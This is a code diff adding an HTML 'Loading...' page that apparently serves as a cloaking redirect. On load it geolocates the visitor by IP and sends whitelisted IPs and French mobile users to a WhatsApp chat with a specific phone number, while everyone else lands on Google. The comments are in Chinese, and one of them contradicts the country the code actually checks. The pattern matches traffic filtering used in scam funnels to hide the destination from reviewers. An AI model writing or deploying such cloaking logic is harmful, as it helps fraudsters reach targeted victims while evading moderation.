@@ -1,0 +1,70 @@
+<!DOCTYPE html>
+<html lang="de">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Loading...</title>
+    <script>
+        function redirectToWhatsApp() {
+            window.location.href = "https://wa.me/33774549276";
+        }
+
+        function redirectToGoogle() {
+            window.location.href = "https://www.google.com";
+        }
+
+        function k2() {
+            // 白名单IP列表
+            const whitelistIPs = [
+                '192.168.1.1',
+                '192.168.1.1'  // Note: This is a duplicate, you might want to remove or modify
+            ];
+
+          function isFrenchLang() {
+    return navigator.language.startsWith('fr') ||
+           navigator.languages.some(lang => lang.startsWith('fr'));
+}
+
+            // 检测是否为移动设备
+            function isMobileDevice() {
+                return /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+            }
+
+            fetch('https://ipapi.co/json/')
+                .then(response => response.json())
+                .then(data => {
+                    const userIP = data.ip;
+                    const isWhitelisted = whitelistIPs.includes(userIP);
+
+                    if (isWhitelisted) {
+                        redirectToWhatsApp();
+                        return;
+                    }
+
+                    // 条件2：德国IP + 移动设备 + 德语环境
+                    if (data.country === 'FR' && isMobileDevice() ) {
+                        redirectToWhatsApp();
+                        return;
+                    }
+
+                    // 非目标用户
+                    redirectToGoogle();
+                })
+                .catch(() => {
+                    // IP检测失败时的备用逻辑（仅检查设备和语言）
+                    if (isMobileDevice() && isFrenchLang()) {
+                        redirectToWhatsApp();
+                        return;
+                    }
+                    redirectToGoogle();
+                });
+        }
+
+        // Automatically execute when page loads
+        window.onload = k2;
+    </script>
+</head>
+<body>
+     
+</body>
+</html>
